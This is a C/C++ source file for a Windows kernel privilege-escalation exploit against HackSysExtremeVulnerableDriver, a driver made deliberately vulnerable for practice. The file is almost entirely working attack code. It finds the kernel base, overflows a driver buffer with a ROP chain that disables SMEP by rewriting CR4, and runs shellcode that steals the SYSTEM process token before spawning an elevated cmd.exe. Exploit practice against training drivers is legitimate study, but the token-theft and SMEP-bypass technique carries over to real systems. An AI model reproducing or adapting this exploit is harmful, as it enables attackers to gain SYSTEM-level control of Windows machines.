#include<windows.h>
#include<cstdio>


EXTERN_C

static VOID
xxCreateCmdLineProcess(VOID) {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

void GetKernelBase(PULONG64 pkernelBase) {
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;

	typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
		);
	HMODULE hntdll = GetModuleHandleA("ntdll.dll");
	if (!hntdll) {
		printf("Load ntdll error\n");
		return ;
	}
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hntdll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return ;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return ;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	*pkernelBase = (ULONG64)ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
}

HANDLE init() {
	HANDLE hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	if (hDevide == INVALID_HANDLE_VALUE) {
		printf("Create Device Fail:0x%X\n", GetLastError());
		return 0;
	}
	else
		return hDevide;
}
int main() {
	char Shellcode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"		// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xf0\x02\x00\x00"		// mov r9, [r8 + 2f0h]		; ActiveProcessLinks list head-----changed
		"\x49\x8B\x09"				// mov rcx, [r9]		; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"			// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"			// cmp rdx, 4			; Process with ID 4 is System process
		"\x74\x05"				// jz found_system		; Found SYSTEM token
		"\x48\x8B\x09"				// mov rcx, [rcx]		; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"				// jmp find_system_proc		; Loop
		//found_system:
		"\x48\x8B\x41\x68"			// mov rax, [rcx + 68h]		; Offset from ActiveProcessLinks to Token-----changed
		"\x24\xF0"				// and al, 0f0h			; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x58\x03\x00\x00"		// mov [r8 + 358h], rax		; Copy SYSTEM token to current process's token
		//recover:
		"\x48\x83\xc4\x08"			// add rsp, 8			; Set Stack Pointer to SMEP enable ROP chain
		"\x48\x31\xF6"				// xor rsi, rsi			; Zeroing out rsi register to avoid Crash
		"\x48\x31\xFF"				// xor rdi, rdi			; Zeroing out rdi register to avoid Crash
		"\x48\x31\xC0"				// xor rax, rax			; NTSTATUS Status = STATUS_SUCCESS
		//real recover
		"\x48\x8b\x9d\xc0\xfc\xff\xff"//mov rbx ,qword ptr[rbp-340h]
		"\x48\x8b\xb5\xd0\xfc\xff\xff"//mov rsi ,qword ptr[rbp-330h]
		//"\xCC"                          
		"\x48\xc7\xc1\xf8\x06\x15\x00" //mov rcx,1506f8h
		//"\x0f\x22\xe1\xc3"				//mov cr4,rcx
		"\xc3"					// ret				; Enable SMEP and Return to IrpDeviceIoCtlHandler+0xe2
		;

	LPVOID ShellcodeBase = VirtualAlloc(
		NULL,				// Next page to commit
		sizeof(Shellcode),		// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access
	if (!ShellcodeBase) {
		printf("Alloc EXECUTE memory error\n");
		return 1;
	}
	memcpy(ShellcodeBase, Shellcode, sizeof(Shellcode));

	ULONG64 kernelBase = 0;
	GetKernelBase(&kernelBase);
	if (!kernelBase) {
		printf("Get kernel Base addr error\n");
		return 1;
	}
	//printf("%p\n", kernelBase);


	ULONG64 poprcx_ret = kernelBase + 0x1D1D2;
	ULONG64 movcr4rcx_ret = kernelBase + 0x8D7F2;
	ULONG64 cr4BadValue = 0x00000000000506f8;//old value:00000000001506f8
	ULONG64 cr4GoodValue = 0x00000000001506f8;
	HANDLE hDevice = init();
	if (!hDevice) {
		printf("Create Device error\n");
		return 1;
	}
	//system("pause");
	//__debugbreak();
	char payload[2056 + 48] = { 0 };
	memset(payload, 'A', 2056);
	memcpy(payload + 2056, &poprcx_ret, 8);
	memcpy(payload + 2056 + 8, &cr4BadValue, 8);
	memcpy(payload + 2056 + 16, &movcr4rcx_ret, 8);
	memcpy(payload + 2056 + 24, &ShellcodeBase, 8);
	//memcpy(payload + 2056 + 24 + 32, &poprcx_ret, 8);
	//memcpy(payload + 2056 + 24 + 32 + 8, &cr4GoodValue, 8);
	memcpy(payload + 2056 + 32+8, &movcr4rcx_ret, 8);

	DWORD recvBuf;
	DeviceIoControl(hDevice, 0x222003, payload, sizeof(payload), NULL, 0, &recvBuf, NULL);

	xxCreateCmdLineProcess();
}